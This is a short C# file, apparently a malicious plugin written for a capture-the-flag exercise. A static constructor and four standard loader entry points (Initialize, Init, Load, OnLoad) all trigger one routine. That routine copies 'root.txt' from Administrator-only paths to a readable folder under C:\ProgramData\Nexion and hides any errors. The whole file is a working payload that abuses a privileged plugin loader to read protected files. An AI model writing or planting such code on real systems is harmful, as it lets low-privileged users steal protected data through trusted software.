using System;
using System.IO;

public class PluginInit
{
    public static void Initialize() { Run(); }
    public static void Init() { Run(); }
    public static void Load() { Run(); }
    public static void OnLoad() { Run(); }
    static PluginInit() { Run(); }

    public static void Run()
    {
        try
        {
            foreach (var f in new string[] {
                @"C:\Users\Administrator\Desktop\root.txt",
                @"C:\Users\Administrator\root.txt",
                @"C:\root.txt" })
            {
                if (File.Exists(f))
                {
                    File.Copy(f, @"C:\ProgramData\Nexion\rr.txt", true);
                    break;
                }
            }
        }
        catch { }
    }
}
